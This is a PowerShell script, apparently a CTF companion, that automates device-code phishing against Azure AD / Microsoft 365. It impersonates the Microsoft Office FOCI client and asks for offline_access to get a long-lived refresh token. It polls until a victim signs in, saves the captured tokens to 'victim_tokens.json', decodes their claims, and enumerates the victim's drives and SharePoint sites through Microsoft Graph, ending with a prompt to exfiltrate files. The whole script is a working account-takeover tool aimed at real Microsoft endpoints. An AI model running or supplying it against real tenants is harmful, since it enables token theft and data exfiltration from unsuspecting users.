<#
.SYNOPSIS
    TokenAbuse-Azure — documented reproduction helper for the OAuth 2.0 device-code
    token-abuse chain used to solve this CTF challenge.

.DESCRIPTION
    A thin, readable wrapper around the public OAuth 2.0 device authorization grant and the
    Microsoft Graph REST API, written to make the WRITEUP.md steps reproducible in an
    AUTHORIZED lab / CTF environment. It:
        1. Requests a device code (FOCI Microsoft Office client by default).
        2. Polls the token endpoint until the user completes sign-in.
        3. Decodes and prints the captured token's scope/identity claims.
        4. Enumerates drives & SharePoint sites via Microsoft Graph.

    This is intentionally minimal and uses only documented, public endpoints. For the full
    red-team toolkit (FOCI rotation, mailbox dumping, CAE handling) use TokenTacticsV2:
        https://github.com/f-bader/TokenTacticsV2

.NOTES
    ⚠️  AUTHORIZED USE ONLY. Run this only against a tenant/user you own or are explicitly
        permitted to test. See the Disclaimer in README.md. Every technique here is publicly
        documented, including by Microsoft.

.EXAMPLE
    ./device-code-abuse.ps1 -Tenant "contoso.onmicrosoft.com"
#>

[CmdletBinding()]
param(
    # Target tenant ID or domain (e.g. contoso.onmicrosoft.com).
    [Parameter(Mandatory)]
    [string]$Tenant,

    # FOCI client to impersonate. Default = Microsoft Office (a family client whose
    # refresh token can be rotated to other first-party apps).
    [string]$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",

    # offline_access => we receive a long-lived refresh token, not just an access token.
    [string]$Scope = "https://graph.microsoft.com/.default offline_access openid profile"
)

$ErrorActionPreference = "Stop"
$base = "https://login.microsoftonline.com/$Tenant/oauth2/v2.0"

# ---------------------------------------------------------------------------
# Step 1 — request a device code
# ---------------------------------------------------------------------------
Write-Host "[*] Requesting device code from $base/devicecode" -ForegroundColor Cyan
$dc = Invoke-RestMethod -Method POST -Uri "$base/devicecode" -Body @{
    client_id = $ClientId
    scope     = $Scope
}

Write-Host ""
Write-Host "  ┌────────────────────────────────────────────────────────────┐" -ForegroundColor Yellow
Write-Host ("  │  Go to : {0,-49}│" -f $dc.verification_uri)              -ForegroundColor Yellow
Write-Host ("  │  Code  : {0,-49}│" -f $dc.user_code)                     -ForegroundColor Yellow
Write-Host ("  │  Valid : {0,-49}│" -f ("{0}s" -f $dc.expires_in))        -ForegroundColor Yellow
Write-Host "  └────────────────────────────────────────────────────────────┘" -ForegroundColor Yellow
Write-Host ""

# ---------------------------------------------------------------------------
# Step 2 — poll the token endpoint until the user authenticates
# ---------------------------------------------------------------------------
Write-Host "[*] Polling for sign-in completion ..." -ForegroundColor Cyan
$deadline = (Get-Date).AddSeconds([int]$dc.expires_in)
$tokens   = $null

while ((Get-Date) -lt $deadline) {
    Start-Sleep -Seconds ([int]$dc.interval)
    try {
        $tokens = Invoke-RestMethod -Method POST -Uri "$base/token" -Body @{
            grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
            client_id   = $ClientId
            device_code = $dc.device_code
        }
        break  # success
    } catch {
        $err = ($_.ErrorDetails.Message | ConvertFrom-Json -ErrorAction SilentlyContinue).error
        switch ($err) {
            "authorization_pending" { Write-Host "    ... waiting for the user to enter the code" -ForegroundColor DarkGray }
            "slow_down"             { Start-Sleep -Seconds 5 }
            "expired_token"         { throw "Device code expired before the user signed in." }
            "authorization_declined"{ throw "User declined the authorization request." }
            default                 { throw $_ }
        }
    }
}

if (-not $tokens) { throw "No tokens captured." }

Write-Host "[+] Authentication successful — tokens captured." -ForegroundColor Green
$tokens | ConvertTo-Json -Depth 5 | Out-File ".\victim_tokens.json"
Write-Host "[+] Saved to .\victim_tokens.json" -ForegroundColor Green

# ---------------------------------------------------------------------------
# Step 3 — decode the access token claims (who are we, what can we do)
# ---------------------------------------------------------------------------
function ConvertFrom-Jwt([string]$jwt) {
    $p = $jwt.Split('.')[1].Replace('-', '+').Replace('_', '/')
    while ($p.Length % 4) { $p += '=' }
    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)) | ConvertFrom-Json
}

$claims = ConvertFrom-Jwt $tokens.access_token
Write-Host ""
Write-Host "[*] Token identity & scope:" -ForegroundColor Cyan
$claims | Select-Object upn, aud, app_displayname, scp | Format-List

# ---------------------------------------------------------------------------
# Step 4 — enumerate Microsoft Graph (drives + SharePoint sites)
# ---------------------------------------------------------------------------
$hdr = @{ Authorization = "Bearer $($tokens.access_token)" }

Write-Host "[*] /me/drives :" -ForegroundColor Cyan
(Invoke-RestMethod -Headers $hdr -Uri "https://graph.microsoft.com/v1.0/me/drives").value |
    Select-Object name, driveType, id | Format-Table -AutoSize

Write-Host "[*] /sites?search=* :" -ForegroundColor Cyan
(Invoke-RestMethod -Headers $hdr -Uri "https://graph.microsoft.com/v1.0/sites?search=*").value |
    Select-Object displayName, webUrl | Format-Table -AutoSize

Write-Host ""
Write-Host "[✓] Recon complete. Drill into the interesting site/drive to locate and exfiltrate" -ForegroundColor Green
Write-Host "    the target file — see WRITEUP.md steps 8-9." -ForegroundColor Green
